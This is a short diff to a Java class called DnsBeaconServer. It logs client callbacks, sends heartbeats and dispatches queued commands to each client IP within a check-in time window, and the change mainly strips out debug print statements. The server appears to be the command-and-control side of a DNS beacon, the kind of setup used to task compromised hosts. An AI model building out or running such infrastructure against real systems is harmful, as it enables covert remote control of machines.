@@ -70,18 +70,14 @@ public class DnsBeaconServer implements Runnable{
             sendHeartbeet(clientIP);
 
             String latestCommand = null;
-            System.out.println("clients: " + clientCommandsToRun.keySet());
+            System.out.println("Callback: " + clientIP);
 
             if (clientCommandsToRun.keySet().contains(clientIP) && clientCommandsToRun.get(clientIP).size() > 0) {
-                System.out.println("success");
                 String temp;
                 while (true) {
                     temp = clientCommandsToRun.get(clientIP).get(0);
-                    System.out.println(temp);
                     JSONObject json = new JSONObject(temp);
-                    System.out.println("time dif: " + ((double)(System.nanoTime() - (Long)json.get("tsReceived")) / 1000000000));
                     if ((double)(System.nanoTime() - (Long)json.get("tsReceived")) / 1000000000 < timeSinceLastCheckIn){
-                        System.out.println("real success");
                         latestCommand = clientCommandsToRun.get(clientIP).remove(0);
                     } else {
                         clientCommandsToRun.get(clientIP).remove(0);
